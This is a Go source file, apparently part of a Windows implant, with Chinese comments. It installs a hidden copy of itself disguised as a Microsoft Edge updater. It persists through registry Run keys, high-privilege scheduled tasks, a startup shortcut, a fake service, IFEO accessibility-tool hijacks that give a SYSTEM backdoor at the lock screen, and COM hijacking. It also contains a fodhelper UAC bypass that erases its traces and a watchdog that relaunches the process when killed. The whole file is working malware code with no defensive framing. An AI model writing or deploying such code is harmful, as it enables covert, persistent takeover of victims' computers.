package main

import (
	"os"
	"path/filepath"
	"strings"
)

// installCopy 把自己复制进 %APPDATA% 隐藏目录，返回落地路径
func installCopy(self, dir string) error {
	os.MkdirAll(dir, 0o700)
	dst := filepath.Join(dir, "msedgeupd.exe")

	if strings.EqualFold(self, dst) && fileExists(dst) {
		logf("already installed at %s", dst)
		return nil
	}

	raw, err := os.ReadFile(self)
	if err != nil {
		return err
	}
	if err := writeFileHidden(dst, raw); err != nil {
		return err
	}
	logf("installed -> %s", dst)
	return nil
}

// payloadPath 返回落地后的可执行路径
func payloadPath() string {
	return filepath.Join(installDir(), "msedgeupd.exe")
}

type persistMethod struct {
	name string
	fn   func() error
}

func persistenceMethods() []persistMethod {
	return []persistMethod{
		{"registry-run", persistRegistryRun},
		{"registry-runonce", persistRegistryRunOnce},
		{"schtask-logon", persistTaskLogon},
		{"schtask-interval", persistTaskInterval},
		{"startup-folder", persistStartupFolder},
		{"service", persistService},
		{"ifeo-sethc", persistIFEO},
		{"com-hijack", persistCOM},
	}
}

func persistRegistryRun() error {
	exe := payloadPath()
	return runHidden("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`,
		"/v", "MicrosoftEdgeUpdate", "/t", "REG_SZ", "/d", exe, "/f")
}

func persistRegistryRunOnce() error {
	exe := payloadPath()
	return runHidden("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		"/v", "EdgeUpdateSvc", "/t", "REG_SZ", "/d", exe, "/f")
}

func persistTaskLogon() error {
	exe := payloadPath()
	return runHidden("schtasks", "/create", "/tn", "MicrosoftEdgeUpdateTaskMachineCore",
		"/tr", exe, "/sc", "onlogon", "/rl", "HIGHEST", "/f")
}

func persistTaskInterval() error {
	exe := payloadPath()
	return runHidden("schtasks", "/create", "/tn", "MicrosoftEdgeUpdateTaskMachineUA",
		"/tr", exe, "/sc", "minute", "/mo", "30", "/rl", "HIGHEST", "/f")
}

func persistStartupFolder() error {
	startup := os.Getenv("APPDATA") + `\Microsoft\Windows\Start Menu\Programs\Startup`
	if _, err := os.Stat(startup); err != nil {
		return err
	}
	dst := filepath.Join(startup, "EdgeUpdate.lnk")
	// 用 powershell 生成指向 payload 的快捷方式，避免手工构造 lua 二进制
	ps := " $s=(New-Object -ComObject WScript.Shell).CreateShortcut('" + dst + "');" +
		"$s.TargetPath='" + payloadPath() + "';$s.WindowStyle=7;$s.Save()"
	return runHidden("powershell", "-NoP", "-NonI", "-W", "Hidden", "-C", ps)
}

func persistService() error {
	exe := payloadPath()
	if err := runHidden("sc", "create", "EdgeUpdateSvc", "binPath=", exe,
		"start=", "auto", "DisplayName=", "Microsoft Edge Update Service"); err != nil {
		return err
	}
	runHidden("sc", "description", "EdgeUpdateSvc", "Keeps Microsoft Edge up to date.")
	return runHidden("sc", "start", "EdgeUpdateSvc")
}

// persistIFEO 劫持 sethc.exe：锁屏界面连按 5 次 Shift 以 SYSTEM 权限拉起
func persistIFEO() error {
	exe := payloadPath()
	key := `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`
	if err := runHidden("reg", "add", key, "/v", "Debugger", "/t", "REG_SZ", "/d", exe, "/f"); err != nil {
		return err
	}
	// 同样的手法挂 utilman / osk，三个入口
	for _, name := range []string{"utilman.exe", "osk.exe", "magnify.exe"} {
		runHidden("reg", "add",
			`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\`+name,
			"/v", "Debugger", "/t", "REG_SZ", "/d", exe, "/f")
	}
	return nil
}

// persistCOM 注册一个 CLSID 劫持，随 explorer 加载
func persistCOM() error {
	exe := payloadPath()
	base := `HKCU\Software\Classes\CLSID\{3543619C-6F6E-4E7C-9C1B-2D1E8E1F3A72}`
	runHidden("reg", "add", base, "/ve", "/t", "REG_SZ", "/d", "EdgeUpdateCom", "/f")
	runHidden("reg", "add", base+`\InprocServer32`, "/ve", "/t", "REG_SZ", "/d", exe, "/f")
	runHidden("reg", "add", base+`\InprocServer32`, "/v", "ThreadingModel", "/t", "REG_SZ", "/d", "Both", "/f")
	// 挂到 explorer 的 ShellIconOverlayIdentifiers，随资源管理器启动
	return runHidden("reg", "add",
		`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers\EdgeUpdate`,
		"/ve", "/t", "REG_SZ", "/d", "{3543619C-6F6E-4E7C-9C1B-2D1E8E1F3A72}", "/f")
}

// elevate 通过 UAC 静默 + fodhelper 绕过提权
func elevate() error {
	if isAdmin() {
		logf("already admin")
		return nil
	}
	exe := payloadPath()
	// fodhelper 自动提权：写入 HKCU 的 ms-settings 命令，再拉起 fodhelper
	runHidden("reg", "add", `HKCU\Software\Classes\ms-settings\Shell\Open\command`,
		"/ve", "/t", "REG_SZ", "/d", exe, "/f")
	runHidden("reg", "add", `HKCU\Software\Classes\ms-settings\Shell\Open\command`,
		"/v", "DelegateExecute", "/t", "REG_SZ", "/d", "", "/f")
	err := runHidden("cmd", "/c", "start", "", "C:\\Windows\\System32\\fodhelper.exe")
	// 清理痕迹
	runHidden("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f")
	return err
}

// watchdog 双进程互保：自己被杀则由子进程拉起
func watchdog() error {
	exe := payloadPath()
	if strings.Contains(strings.ToLower(os.Args[0]), "watch") {
		return nil
	}
	// 每隔一段时间检查自身存活标记，若父进程消失则重新拉起
	go func() {
		for {
			sleepSeconds(45)
			cmd := execCommand(exe, "-skipcheck=false")
			hideWindow(cmd)
			_ = cmd.Start()
			sleepSeconds(180)
		}
	}()
	return nil
}
